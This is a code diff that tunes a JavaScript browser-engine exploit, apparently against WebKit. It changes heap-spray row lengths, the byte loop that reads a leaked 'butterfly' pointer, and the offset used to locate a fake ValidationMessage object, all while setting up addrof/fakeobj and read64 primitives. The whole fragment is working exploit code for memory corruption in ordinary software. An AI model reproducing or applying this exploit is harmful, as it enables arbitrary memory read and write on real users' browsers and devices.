@@ -36,8 +36,8 @@ var g_message_body_leak = null;
 
 var g_obj_str = {};
 
-var g_rows1 = '1px,'.repeat(LENGTH_VALIDATION_MESSAGE / 8 - 3) + "1px";
-var g_rows2 = '2px,'.repeat(LENGTH_VALIDATION_MESSAGE / 8 - 3) + "2px";
+var g_rows1 = '1px,'.repeat(LENGTH_VALIDATION_MESSAGE / 16 - 3) + "1px";
+var g_rows2 = '2px,'.repeat(LENGTH_VALIDATION_MESSAGE / 16 - 3) + "2px";
 
 var g_round = 1;
 var g_input = null;
@@ -109,7 +109,7 @@ function setupRW() {
 	/* Set up addrof/fakeobj primitives */
 	g_ab_slave.leakme = 0x1337;
 	var bf = 0;
-	for(var i = 16; i >= 8; i--)
+	for(var i = 15; i >= 8; i--)
 		bf = 256 * bf + g_relative_rw[g_ab_index + i];
 	g_jsview_butterfly = new Int64(bf);
 	if(!read64(g_jsview_butterfly.sub(16)).equals(new Int64("0xffff000000001337")))
@@ -363,7 +363,7 @@ function dumpTargetObj() {
 
 function findTargetObj() {
 	for (let i = 0; i < g_arr_ab_1.length; i++) {
-		if (!Int64.fromDouble(g_arr_ab_1[i][3]).equals(Int64.Zero)) {
+		if (!Int64.fromDouble(g_arr_ab_1[i][2]).equals(Int64.Zero)) {
 			debug_log("[+] Found fake ValidationMessage");
 
 			if (g_round === 2) {
